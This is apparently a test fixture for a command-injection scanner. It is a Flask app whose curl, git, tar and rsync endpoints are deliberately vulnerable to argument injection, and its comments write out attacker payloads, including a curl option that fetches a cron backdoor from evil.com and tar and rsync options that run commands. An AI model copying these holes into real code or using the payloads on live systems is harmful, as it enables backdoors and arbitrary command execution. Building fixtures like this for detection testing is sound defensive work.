# Fixture: py-argument-injection — subprocess with list but user controls arguments
# Expected: TRUE POSITIVE (medium confidence)
# CWE: CWE-78
# Agent: cmdi
# Pattern: subprocess.run() with list args (no shell), but user controls argument values
#          that change command semantics (argument injection / option injection)

import subprocess
from pathlib import Path
from flask import Flask, request, jsonify, send_file

app = Flask(__name__)

DOWNLOAD_DIR = Path("/var/app/downloads")


@app.route("/api/fetch", methods=["POST"])
def fetch_url():
    """Download a file from a URL using curl."""
    url = request.json.get("url")
    filename = request.json.get("filename", "output.html")
    # VULNERABLE: user controls the URL argument to curl
    # No shell injection, but argument injection is possible:
    # Attacker sends: {"url": "-o /etc/cron.d/backdoor http://evil.com/cron"}
    # or: {"url": "--config http://evil.com/curlrc"}
    # curl interprets the user string as options, not just a URL
    result = subprocess.run(
        ["curl", "-sS", "-o", str(DOWNLOAD_DIR / filename), url],
        capture_output=True,
        text=True,
    )
    return jsonify({"returncode": result.returncode, "stderr": result.stderr})


@app.route("/api/git/log")
def git_log():
    """Show git log for a given ref."""
    ref = request.args.get("ref", "HEAD")
    repo_path = request.args.get("repo", "/var/repos/default")
    # VULNERABLE: user controls ref argument to git log
    # Attacker sends: ?ref=--output=/tmp/pwned
    # or: ?ref=--exec=id (for git log --exec variant)
    result = subprocess.run(
        ["git", "-C", repo_path, "log", "--oneline", "-20", ref],
        capture_output=True,
        text=True,
    )
    return jsonify({"log": result.stdout.strip().split("\n")})


@app.route("/api/archive", methods=["POST"])
def create_archive():
    """Create tar archive with user-specified files."""
    files = request.json.get("files", [])
    archive_name = request.json.get("name", "archive.tar.gz")
    base_dir = "/var/app/uploads"
    # VULNERABLE: user controls file list passed to tar
    # Attacker sends: {"files": ["--checkpoint=1", "--checkpoint-action=exec=id", "legit.txt"]}
    # tar interprets list items starting with -- as options
    cmd = ["tar", "-czf", f"/tmp/{archive_name}", "-C", base_dir] + files
    result = subprocess.run(cmd, capture_output=True, text=True)
    return jsonify({"returncode": result.returncode, "stderr": result.stderr})


@app.route("/api/rsync", methods=["POST"])
def sync_files():
    """Rsync files to a remote destination."""
    source = request.json.get("source")
    destination = request.json.get("destination")
    # VULNERABLE: user controls rsync arguments
    # Attacker sends: {"source": "-e sh /tmp/evil.sh", "destination": "remote:/tmp/"}
    # rsync -e allows specifying an arbitrary shell command as transport
    result = subprocess.run(
        ["rsync", "-avz", source, destination],
        capture_output=True,
        text=True,
    )
    return jsonify({"returncode": result.returncode, "output": result.stdout})
